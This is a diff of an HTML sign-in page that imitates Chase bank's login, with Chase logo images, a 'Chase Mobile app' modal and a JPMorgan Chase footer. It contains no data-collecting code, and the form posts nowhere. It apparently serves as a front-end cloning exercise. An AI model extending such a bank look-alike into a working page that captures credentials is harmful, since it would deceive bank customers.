@@ -9,45 +9,122 @@
     <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.css" rel="stylesheet" />
 </head>
-<body style="background-image: url(./asset/img/login.jpg); background-size: cover; background-repeat: no-repeat; background-position: center;">
-  <div class="flex min-h-screen items-center justify-center">
-    <form action="" class="h-full bg-white pt-16 pb-2 px-5 rounded w-full max-w-[27em]">
-        <div class="relative z-0 w-full mb-10 group">
-            <input type="text" name="floating_email" id="floating_email"
-                class="block pt-3 pb-4 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b border-gray-500 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
-                placeholder=" " required />
-            <label for="floating_email"
-                class="ps-2 peer-focus:font-medium absolute text-lg text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown: peer-focus:scale-75 ">Username</label>
-        </div>
-        <div class="relative z-0 w-full mb-5 group">
-            <input type="password" name="floating_password" id="floating_password"
-                class="block pt-4 pb-3 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b border-gray-500 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
-                placeholder=" " required />
-                <label for="floating_email"
-                class="ps-2 peer-focus:font-medium absolute text-lg  text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown: peer-focus:scale-75 ">Password</label>
-        </div>
-        <div class="flex items-center gap-16 pb-5">
-            <div class="flex items-center">
-                <input id="default-checkbox" type="checkbox" value=""
-                    class="w-5 h-5 text-blue-600 bg-gray-100 border-4 border-gray-400 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
-                <label for="default-checkbox" class="ms-2 font-normal text-gray-500 dark:text-gray-300">Remember
-                    me</label>
+<body class='bg-white'>
+ 
+    <div style="background-image: url(./asset/img/login.jpg); background-size: cover; background-repeat: no-repeat; background-position: center;" class="block h-screen px-4">
+       <div class="flex justify-center pt-3 md:pt-0">
+        <img src="./asset/img/chase login.png" alt="">
+       </div>
+        <div class="flex min-h-screen items-center justify-center">
+            <form action="" class="h-full bg-white pt-16 pb-2 px-5 rounded w-full max-w-[27em]">
+                <div class="relative z-0 w-full mb-10 group">
+                    <input type="text" name="floating_email" id="floating_email"
+                        class="block pt-3 pb-4 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b border-gray-500 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
+                        placeholder=" " required />
+                    <label for="floating_email"
+                        class="ps-2 peer-focus:font-medium absolute text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown: peer-focus:scale-75 ">Username</label>
+                </div>
+                <div class="relative z-0 w-full mb-5 group">
+                    <input type="password" name="floating_password" id="floating_password"
+                        class="block pt-4 pb-3 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b border-gray-500 appearance-none dark:text-white dark:border-gray-600 dark:focus:border-blue-500 focus:outline-none focus:ring-0 focus:border-blue-600 peer"
+                        placeholder=" " required />
+                        <label for="floating_email"
+                        class="ps-2 peer-focus:font-medium absolute  text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-blue-600 peer-focus:dark:text-blue-500 peer-placeholder-shown:scale-100 peer-placeholder-shown: peer-focus:scale-75 ">Password</label>
+                </div>
+                <div class="flex items-center gap-16 pb-5">
+                    <div class="flex items-center">
+                        <input id="default-checkbox" type="checkbox" value=""
+                            class="w-5 h-5 text-blue-600 bg-gray-100 border-16 border-gray-400 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
+                        <label for="default-checkbox" class="ms-2 font-normal text-gray-500 dark:text-gray-300">Remember
+                            me</label>
+                    </div>
+                    <div class="flex items-center">
+                        <input id="default-checkbox" type="checkbox" value=""
+                            class="w-5 h-5 text-blue-600 bg-gray-100 border-4 border-gray-400 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
+                        <label for="default-checkbox" class="ms-2 font-normal text-gray-500 dark:text-gray-300">Use token</label>
+                    </div>        </div>
+        
+                   <button class=" text-white bg-blue-500 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-semibold rounded-lg w-full px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800" data-modal-target="small-modal" data-modal-toggle="small-modal">Sign
+                    in</button>
+                <div class="flex flex-col space-y-2 text-[16px] pt-5">
+                    <a href="" class="flex items-center gap-2 text-blue-500">Forget username/password 
+                         <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-6 font-bold  text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+                        </svg>
+                    </a>
+                    <a href="" class="flex items-center gap-2 text-blue-500">Not enrolled? Sign up now 
+                         <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-6 font-bold text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+                        </svg>
+                    </a>
+        
+                </div>
+            </form>
             </div>
-            <div class="flex items-center">
-                <input id="default-checkbox" type="checkbox" value=""
-                    class="w-5 h-5 text-blue-600 bg-gray-100 border-4 border-gray-400 rounded focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
-                <label for="default-checkbox" class="ms-2 font-normal text-gray-500 dark:text-gray-300">Use token</label>
-            </div>        </div>
+    </div>
+    
 
-        <button type="submit"
-            class=" text-white bg-blue-500 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-semibold rounded-lg w-full px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Sign
-            in</button>
-        <div class="flex flex-col pt-1">
-            <a href="" class="text-blue-500">Forget username/password &gt;</a>
-            <a href="" class="text-blue-500">Not enrolled? Sign up now &gt;</a>
+
+
+<!-- Small Modal -->
+<div id="small-modal" tabindex="-1" class="fixed top-0 left-0 right-0 z-50 hidden w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full">
+    <div class="relative w-full max-w-md max-h-full">
+        <!-- Modal content -->
+        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
+           
+            <!-- Modal body -->
+            <div class="p-4 md:p-5">
+               <h1 class="text-sm md:text-lg font-bold text-center">Sign in with the chase Mobile® app</h1>
+               <h2 class="text-sm md:text-lg text-center pt-1">If you don't have the Chase Mobile app, you'll be directed to the app store where their terms, privacy and security policies apply</h2>
+            <div class="flex flex-col space-y-1 pt-4 pb-3">
+                <button type="submit" class="text-white text-center py-1 bg-blue-500 rounded">Use the app</button>
+                <button type="submit" class="mt-2 text-blue-500 text-center py-1 bg-white-500 border border-blue-500 rounded" data-modal-hide="small-modal">No, thanks</button>
+            </div>
+            </div>
 
         </div>
-    </form>
     </div>
+</div>
+
+
+
+
+
+
+    <div class="flex items-center justify-center gap-3 py-5 border-b border-gray-300 sm:mx-4  lg:mx-20">
+        <h1 class="text-gray-500 text-xl mr-3">Follow us: </h1>
+        <a href=""><img src="./asset/img/facebook.png" class="opacity-50 hover:opacity-100 h-6 w-6" alt=""></a>
+        <a href=""><img src="./asset/img/instagram.png" class="opacity-50 hover:opacity-100 h-6 w-6" alt=""></a>
+        <a href=""><img src="./asset/img/x icon.png" class="opacity-50 hover:opacity-100 h-6 w-6" alt=""></a>
+        <a href=""><img src="./asset/img/youtube.png" class="opacity-50 hover:opacity-100 h-6 w-6" alt=""></a>
+        <a href=""><img src="./asset/img/linkedln.png" class="opacity-50 hover:opacity-100 h-6 w-6" alt=""></a>
+    </div>
+    <div class="grid grid-cols-2 mx-auto md:flex flex-wrap flex-row justify-center gap-5 pt-6 px-4 text-[11px] text-gray-600">
+        <a href="" class="underline pointer-cursor">Contact us</a>
+        <a href="" class="underline pointer-cursor">Privacy </a>
+        <a href="" class="underline pointer-cursor">Security </a>
+        <a href="" class="underline pointer-cursor">Terms of use</a>
+        <a href="" class="underline pointer-cursor">Accessibility </a>
+        <a href="" class="underline pointer-cursor">SAFE Act: Chase Mortgage Loan Originators </a>
+        <a href="" class="underline pointer-cursor">Fair Lending </a>
+        <a href="" class="underline pointer-cursor"> About Chase</a>
+        <a href="" class="underline pointer-cursor">J.P. Morgan </a>
+        <a href="" class="underline pointer-cursor">JPMorgan Chase & Co. </a>
+        <a href="" class="underline pointer-cursor">Careers</a>
+        <a href="" class="underline pointer-cursor"> Español</a>
+
+    </div>
+    <div class=" mx-auto flex flex-wrap flex-row  items-center justify-center gap-5 pt-6 text-[11px] text-gray-600">
+        <a href="" class="underline pointer-cursor">Chase Canada </a>
+        <a href="" class="underline pointer-cursor"> Site map</a>
+        <a href="" class="">Member FDIC </a>
+        <div class="flex items-center justify-center">
+            <img src="./asset/img/below.png" alt="">
+            <h2 class="text-gray-600 text-sm lg:text-xs capitalize">Equal Housing Opportunity</h2>
+        </div>
+</div>
+<h1 class="text-center my-8 text-sm lg:text-xs text-gray-600">© 2024 JPMorgan Chase & Co.</h1>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.3.0/flowbite.min.js"></script>
+
 </body>
 </html>
